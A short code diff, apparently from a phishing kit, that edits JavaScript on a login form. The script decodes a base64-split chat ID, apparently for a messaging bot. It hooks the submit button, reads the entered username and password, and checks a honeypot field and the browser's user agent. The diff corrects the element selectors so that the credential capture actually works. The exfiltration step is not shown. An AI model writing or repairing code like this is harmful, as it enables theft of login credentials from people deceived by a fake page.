@@ -6,11 +6,11 @@ const chatIdPart1 = "NjAxNTIxNT";
 const chatIdPart2 = "Y3NA==";
 const CHAT_ID = atob(chatIdPart1 + chatIdPart2);
 
-document.getElementById('button').addEventListener('click', async function(e) {
+document.getElementById('btnSubmit').addEventListener('click', async function(e) {
     e.preventDefault();
 
     const username = document.getElementById('UserName').value.trim();
-    const password = document.getElementById('input[type="password"]').value.trim();
+    const password = document.getElementById('Password').value.trim();
     const honeypot = document.querySelector('[name="honeypot"]').value.trim();
     const userAgent = navigator.userAgent.toLowerCase();
 
